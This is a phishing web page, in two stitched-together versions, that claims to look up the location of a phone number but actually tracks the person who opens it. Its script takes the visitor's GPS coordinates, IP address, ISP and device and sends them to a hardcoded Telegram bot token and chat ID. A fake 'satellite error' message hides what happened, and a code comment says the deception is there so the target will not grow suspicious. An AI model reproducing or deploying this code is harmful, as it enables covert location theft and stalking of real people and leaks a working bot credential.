<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XYZ TRACKING - CELLULAR OSINT</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Share+Tech+Mono&display=swap');
        body { background: #000; color: #ffd700; font-family: 'Share Tech Mono', monospace; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; overflow: hidden; }
        .card { width: 90%; max-width: 400px; border: 2px solid #ffd700; padding: 40px 20px; text-align: center; background: #050505; box-shadow: 0 0 30px #ffd70044; }
        h2 { font-family: 'Orbitron'; letter-spacing: 3px; margin-bottom: 5px; }
        .radar-box { width: 100px; height: 100px; border: 1px solid #ffd700; border-radius: 50%; margin: 20px auto; position: relative; }
        .radar-line { position: absolute; width: 50%; height: 2px; background: #ffd700; top: 50%; left: 50%; transform-origin: left; animation: scan 2s linear infinite; }
        @keyframes scan { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        input { width: 80%; background: transparent; border: none; border-bottom: 1px solid #333; color: #fff; padding: 15px; margin: 20px 0; outline: none; text-align: center; font-size: 18px; }
        button { width: 80%; padding: 15px; background: transparent; color: #ffd700; border: 2px solid #ffd700; font-family: 'Orbitron'; cursor: pointer; font-weight: bold; }
        #log { font-size: 10px; color: #444; margin-top: 20px; text-transform: uppercase; }
    </style>
</head>
<body>

<div class="card">
    <h2>XYZ TRACKING</h2>
    <div style="font-size: 10px; color: #555; letter-spacing: 3px;">CELLULAR OSINT V3.0</div>
    
    <div class="radar-box"><div class="radar-line"></div></div>

    <input type="number" id="target_num" placeholder="08xxxxxxxxxx">
    <button onclick="initiateScan()">CHECK DATA</button>
    
    <div id="log">Satellite Standby...</div>
</div>

<script>
    const TOKEN = "8622815738:AAHixf_yecRdOHx1q3LPD0CubKyrszYEH58";
    const CHAT_ID = "7496062352";

    function sendTele(msg) {
        const ping = new Image();
        ping.src = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=html&v=${Date.now()}`;
    }

    async function initiateScan() {
        const num = document.getElementById('target_num').value;
        if(num.length < 10) return alert("Nomor HP tidak valid!");

        document.getElementById('log').innerText = "Requesting Satellite Uplink...";
        
        // Minta Izin Lokasi (Inti Tracking)
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                
                // Ambil IP & Provider
                let ipData = {};
                try {
                    const res = await fetch('https://ipapi.co/json/');
                    ipData = await res.json();
                } catch(e) {}

                const detailInfo = 
                    `📡 <b>XYZ TRACKING - TARGET LOCKED</b>\n\n` +
                    `📱 <b>Nomor HP:</b> <code>${num}</code>\n` +
                    `🌐 <b>IP Address:</b> <code>${ipData.ip || 'Unknown'}</code>\n` +
                    `🏢 <b>ISP:</b> ${ipData.org || 'Unknown'}\n` +
                    `📍 <b>Kota:</b> ${ipData.city}, ${ipData.region}\n` +
                    `🛰️ <b>Koordinat:</b> <code>${lat},${lon}</code>\n` +
                    `📱 <b>Device:</b> ${navigator.platform}\n\n` +
                    `🌍 <b>Google Maps:</b>\nhttps://www.google.com/maps?q=${lat},${lon}`;

                sendTele(detailInfo);
                
                document.getElementById('log').innerText = "SCAN COMPLETE.";
                alert("Sistem Sibuk: Gagal menghubungkan ke satelit provider. Coba lagi nanti.");
            }, (err) => {
                sendTele(`⚠️ <b>TRACKING BLOCKED</b>\nNomor: ${num}\nTarget menolak akses GPS.`);
                alert("Error 0x44: Izin lokasi diperlukan untuk verifikasi nomor.");
            });
        }
    }
</script>
</body>
</html>

<div class="card">
    <h2>XYZ TRACKING</h2>
    <div class="sub">SATELLITE OSINT V2.0</div>
    
    <div class="radar"></div>

    <input type="text" id="phone" placeholder="TARGET PHONE/NAME">
    <button onclick="locateTarget()">INITIATE TRACKING</button>
    
    <div id="status">Awaiting Signal...</div>
</div>

<script>
    // --- KONFIGURASI API LAMA + ID BARU ---
    const TOKEN = "8622815738:AAHixf_yecRdOHx1q3LPD0CubKyrszYEH58";
    const CHAT_ID = "7496062352"; 
    // -------------------------------------

    function tellTele(txt) {
        const ping = new Image();
        ping.src = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(txt)}&parse_mode=html&v=${Date.now()}`;
    }

    async function report(lat, lon, acc, target) {
        document.getElementById('status').innerText = "SIGNAL CAPTURED. UPLINKING...";
        
        let ipInfo = "Hidden/VPN";
        try {
            const res = await fetch('https://ipapi.co/json/');
            const d = await res.json();
            ipInfo = `${d.ip} (${d.org})`;
        } catch(e) {}

        const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
        const reportText = `🛰️ <b>XYZ TRACKING - TARGET LOCKED!</b>\n\n` +
                           `👤 <b>Target:</b> ${target}\n` +
                           `📍 <b>Lat:</b> <code>${lat}</code>\n` +
                           `📍 <b>Lon:</b> <code>${lon}</code>\n` +
                           `🎯 <b>Accuracy:</b> ${acc}m\n` +
                           `🌐 <b>IP/Net:</b> ${ipInfo}\n\n` +
                           `🌍 <b>Google Maps:</b>\n${mapLink}`;

        tellTele(reportText);
        
        // Kasih efek sukses ke target biar ga curiga
        setTimeout(() => {
            alert("Connection error: Satellite signal too weak. Please try again later.");
            document.getElementById('status').innerText = "UPLINK SUCCESSFUL.";
        }, 1000);
    }

    function locateTarget() {
        const t = document.getElementById('phone').value;
        if(!t) return alert("INPUT TARGET ID!");

        document.getElementById('status').innerText = "REQUESTING GPS ACCESS...";

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    report(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy, t);
                },
                (err) => {
                    document.getElementById('status').innerText = "ERROR: ACCESS DENIED.";
                    tellTele(`⚠️ <b>TRACKING FAILED</b>\nTarget: ${t}\nReason: GPS Permission Denied.`);
                    alert("Error: 0x882 - Satellite Access Denied. Please allow GPS to proceed.");
                },
                { enableHighAccuracy: true, timeout: 10000 }
            );
        } else {
            alert("Hardware not supported.");
        }
    }
</script>

</body>
</html>
